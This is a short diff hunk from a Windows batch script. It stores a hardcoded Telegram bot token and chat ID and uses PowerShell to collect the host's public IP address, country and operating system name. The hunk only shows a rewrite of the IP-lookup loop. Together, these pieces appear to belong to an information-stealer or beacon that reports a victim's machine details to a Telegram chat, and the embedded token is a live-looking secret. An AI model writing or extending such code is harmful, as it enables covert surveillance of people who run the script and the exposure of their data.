@@ -25,11 +25,13 @@ setlocal EnableDelayedExpansion
 set "TOKEN=7615353876:AAF-Mcj1DDxs85m-pU4fAIR34jJ1r8y7p54"
 set "CHAT_ID=5674938532"
 
-for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { $json = Invoke-RestMethod -Uri 'http://ip-api.com/json/'; Write-Host ($json.query + '|' + $json.country) } catch { Write-Host 'Error|Error' }"') do (
-    for /f "tokens=1,2 delims=|" %b in ("%a") do (
-        set "IP=%b"
-        set "Country=%c"
-    )
+for /f "tokens=1,2 delims=|" %a in ('
+  powershell -NoProfile -Command ^
+    "$response = Invoke-RestMethod -Uri 'http://ip-api.com/json/';" ^
+    "Write-Host ($response.query.Trim() + '|' + $response.country.Trim())"
+') do (
+    set "IP=%a"
+    set "Country=%b"
 )
 
 for /f "tokens=*" %a in ('powershell -NoProfile -Command "(Get-WmiObject -Class Win32_OperatingSystem).Caption"') do (
